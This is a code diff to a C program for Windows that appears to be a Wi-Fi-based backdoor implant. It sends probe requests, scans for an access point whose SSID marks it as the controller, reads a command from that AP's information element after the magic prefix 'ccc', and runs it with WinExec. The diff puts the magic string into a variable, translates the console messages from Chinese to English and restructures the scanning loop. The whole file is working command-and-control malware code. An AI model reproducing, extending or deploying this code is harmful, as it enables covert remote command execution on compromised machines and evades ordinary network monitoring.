@@ -31,6 +31,7 @@ PWLAN_INTERFACE_INFO pIfInfo;
 
 PWLAN_AVAILABLE_NETWORK_LIST pBssList;
 PWLAN_AVAILABLE_NETWORK pBssEntry;
+char* magic_code = "ccc";
 
 void init(){
 
@@ -112,8 +113,9 @@ bool get_Wlan(){
 	}
 	else {
 		//打印wlan设备信息
-		wprintf(L"Num Entries: %lu\n", pIfList->dwNumberOfItems);
-		wprintf(L"Current Index: %lu\n", pIfList->dwIndex);
+		printf("[+]Interface Information：\n");
+		wprintf(L"  Numbers of Interface: %lu\n", pIfList->dwNumberOfItems);
+		wprintf(L"  Current Index: %lu\n", pIfList->dwIndex);
 		for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
 			pIfInfo = (WLAN_INTERFACE_INFO *)&pIfList->InterfaceInfo[i];
 			wprintf(L"  Interface Index[%d]:\t %lu\n", i, i);
@@ -156,7 +158,7 @@ bool get_Wlan(){
 				wprintf(L"Unknown state %ld\n", pIfInfo->isState);
 				break;
 			}
-			wprintf(L"\n");
+			//wprintf(L"\n");
 		}
 	}
 
@@ -181,41 +183,11 @@ bool sendRequest(char *ssid, PWLAN_RAW_DATA pwlan_data){
 		return false;
 	}
 	else {
-		printf("已发送上线请求!!\n");
+		printf("[+]Sending probe Request...\n");
 	}
 	//释放空间
 	free(pdo);
 	return true;
-}
-
-WLAN_AVAILABLE_NETWORK* getssid(char *ssid){
-	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
-	//获取可用AP 这里需要修改
-	dwResult = WlanGetAvailableNetworkList(hClient,
-		&pIfInfo->InterfaceGuid,
-		0,
-		NULL,
-		&pBssList);
-
-	if (dwResult != ERROR_SUCCESS) {
-		wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
-			dwResult);
-	}
-	else {
-		//wprintf(L"WLAN_AVAILABLE_NETWORK_LIST for this interface\n");
-
-		wprintf(L" Num Entries: %lu\n\n", pBssList->dwNumberOfItems);
-		for (int j = 0; j < pBssList->dwNumberOfItems; j++) {
-			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
-			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0){
-				printf("找到控制端!\n");
-				return pBssEntry;
-				//getcmd(pBssEntry, ssid);
-
-			}
-		}
-	}
-	return pBssEntry;
 }
 void getcmd(WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid){
 	PWLAN_BSS_LIST ppWlanBssList;
@@ -245,13 +217,14 @@ void getcmd(WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid){
 				char *magic = (char *)&ie->val[0];
 				printf(magic);
 				printf("\n");
-				if (strncmp(magic, "ccc", 3) == 0)
+				if (strncmp(magic, magic_code, strlen(magic_code)) == 0)
 				{
 					char command[240] = { 0 };
 					strncpy_s(command, magic + 3, ie->len - 3);
 					//执行命令
-					printf("提取命令：%s\n", command);
+					printf("Get Commands：%s\n", command);
 					WinExec(command, SW_NORMAL);
+					system("pause");
 					exit(1); //退出
 					break;
 				}
@@ -266,6 +239,38 @@ void getcmd(WLAN_AVAILABLE_NETWORK *pBssEntry, char *ssid){
 		}
 	}
 }
+void getssid(char *ssid){
+	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
+	//获取可用AP 这里需要修改
+	dwResult = WlanGetAvailableNetworkList(hClient,
+		&pIfInfo->InterfaceGuid,
+		0,
+		NULL,
+		&pBssList);
+
+	if (dwResult != ERROR_SUCCESS) {
+		wprintf(L"WlanGetAvailableNetworkList failed with error: %u\n",
+			dwResult);
+	}
+	else {
+		//wprintf(L"WLAN_AVAILABLE_NETWORK_LIST for this interface\n");
+
+		wprintf(L"[+]Numbers of AP: %lu\n", pBssList->dwNumberOfItems);
+		for (int j = 0; j < pBssList->dwNumberOfItems; j++) {
+			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& pBssList->Network[j];
+			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0){
+				printf("[+]Find Server!\n\n");
+				getcmd(pBssEntry, ssid);
+				//return pBssEntry;
+				//getcmd(pBssEntry, ssid);
+
+			}
+		}
+	}
+	printf("[+]Searching Server...\n\n");
+	//return pBssEntry;
+}
+
 int wmain()
 {
 
@@ -281,8 +286,8 @@ int wmain()
 			return 1;
 		if (!sendRequest("ghost", pwlan_data))
 			return 1;
-		ssid_entry = getssid(ssid);
-		getcmd(ssid_entry, ssid);
+		getssid(ssid);
+		//getcmd(ssid_entry, ssid);
 
 		//间隔
 		Sleep(3000);
